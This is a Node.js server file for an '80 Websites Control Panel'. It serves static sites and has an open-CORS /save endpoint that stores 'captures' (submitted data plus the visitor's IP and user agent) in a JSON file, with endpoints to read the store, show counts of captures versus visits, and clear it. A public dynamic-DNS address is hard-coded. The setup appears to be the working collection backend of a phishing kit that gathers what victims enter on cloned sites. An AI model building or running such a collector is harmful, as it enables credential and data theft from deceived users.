/**
 * 80 Websites Control Panel - Node.js Server
 * Serves static sites + saves captures to data.json
 *
 * Run:  node server.js
 * Then: http://localhost:8080/control.html
 * Or:   http://pastor.deluxpaid.giize.com:8080/control.html
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 8080;
const HOST = '0.0.0.0';
const BASE_DIR = __dirname;
const DATA_FILE = path.join(BASE_DIR, 'data.json');
const LOG_FILE = path.join(BASE_DIR, 'access.log');

// ---------- MIME types ----------
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg':  'image/svg+xml',
  '.ico':  'image/x-icon',
  '.txt':  'text/plain; charset=utf-8',
  '.woff': 'font/woff',
  '.woff2':'font/woff2',
};

// ---------- helpers ----------
function ensureDataFile() {
  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]');
}

function readData() {
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch (e) { return []; }
}

function writeData(arr) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
    return true;
  } catch (e) { console.error('write error', e); return false; }
}

function appendLog(line) {
  try {
    fs.appendFileSync(LOG_FILE, line + '\n');
  } catch (e) {}
}

function sendJson(res, obj, status = 200) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Cache-Control': 'no-store'
  });
  res.end(body);
}

function sendFile(res, filePath) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('404 Not Found');
      return;
    }
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, {
      'Content-Type': MIME[ext] || 'application/octet-stream',
      'Content-Length': data.length,
      'Cache-Control': 'no-store'
    });
    res.end(data);
  });
}

function getClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return xff.split(',')[0].trim();
  return req.socket.remoteAddress || 'unknown';
}

// ---------- server ----------
ensureDataFile();

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = decodeURIComponent(parsed.pathname);
  const method = req.method.toUpperCase();
  const ip = getClientIp(req);

  // Access log
  appendLog(`${new Date().toISOString()} ${ip} ${method} ${pathname}`);

  // CORS preflight
  if (method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    return res.end();
  }

  // ----- API: GET /data.json -----
  if (pathname === '/data.json' && method === 'GET') {
    return sendJson(res, readData());
  }

  // ----- API: POST /save -----
  if (pathname === '/save' && method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
      if (body.length > 1e6) req.destroy();
    });
    req.on('end', () => {
      try {
        const payload = JSON.parse(body || '{}');
        const entry = {
          id: Date.now().toString() + Math.random().toString(36).slice(2, 8),
          time: new Date().toISOString(),
          ip: ip,
          user_agent: req.headers['user-agent'] || '',
          site: payload.site || 'unknown',
          category: payload.category || 'unknown',
          type: payload.type || 'DATA',
          data: payload.data || {},
          page: payload.page || ''
        };
        const db = readData();
        db.unshift(entry);
        if (db.length > 2000) db.length = 2000;
        writeData(db);
        console.log(`📥 [${entry.type}] ${entry.category}/${entry.site} from ${ip}`);
        sendJson(res, { ok: true, id: entry.id });
      } catch (e) {
        sendJson(res, { ok: false, error: String(e) }, 400);
      }
    });
    return;
  }

  // ----- API: POST /clear -----
  if (pathname === '/clear' && method === 'POST') {
    writeData([]);
    return sendJson(res, { ok: true, message: 'data.json cleared' });
  }

  // ----- API: GET /stats -----
  if (pathname === '/stats' && method === 'GET') {
    const db = readData();
    const byType = {};
    const byCategory = {};
    db.forEach(e => {
      byType[e.type] = (byType[e.type] || 0) + 1;
      byCategory[e.category] = (byCategory[e.category] || 0) + 1;
    });
    return sendJson(res, {
      total: db.length,
      captures: db.filter(e => e.type !== 'VISIT').length,
      visits: db.filter(e => e.type === 'VISIT').length,
      by_type: byType,
      by_category: byCategory,
      last: db[0] || null
    });
  }

  // ----- Static files -----
  let filePath = pathname === '/' ? '/control.html' : pathname;
  filePath = path.join(BASE_DIR, filePath);

  // Security: prevent path traversal
  if (!filePath.startsWith(BASE_DIR)) {
    res.writeHead(403); return res.end('Forbidden');
  }

  fs.stat(filePath, (err, stat) => {
    if (err) return sendFile(res, filePath);
    if (stat.isDirectory()) {
      // try index.html
      const idx = path.join(filePath, 'index.html');
      fs.stat(idx, (e2, s2) => {
        if (!e2 && s2.isFile()) sendFile(res, idx);
        else sendFile(res, path.join(filePath, 'index.html'));
      });
      return;
    }
    sendFile(res, filePath);
  });
});

server.listen(PORT, HOST, () => {
  console.log('');
  console.log('  ╔══════════════════════════════════════════════════╗');
  console.log('  ║     80 WEBSITES CONTROL PANEL · Node.js         ║');
  console.log('  ╚══════════════════════════════════════════════════╝');
  console.log('');
  console.log(`  🚀 Server running on http://${HOST}:${PORT}`);
  console.log(`  🌐 Control panel:  http://localhost:${PORT}/control.html`);
  console.log(`  📊 Data file:      ${DATA_FILE}`);
  console.log(`  📝 Access log:     ${LOG_FILE}`);
  console.log('');
  console.log('  Public:  http://pastor.deluxpaid.giize.com:' + PORT + '/control.html');
  console.log('  Press CTRL+C to stop');
  console.log('');
});

process.on('SIGINT', () => {
  console.log('\n👋 Server stopped');
  process.exit(0);
});
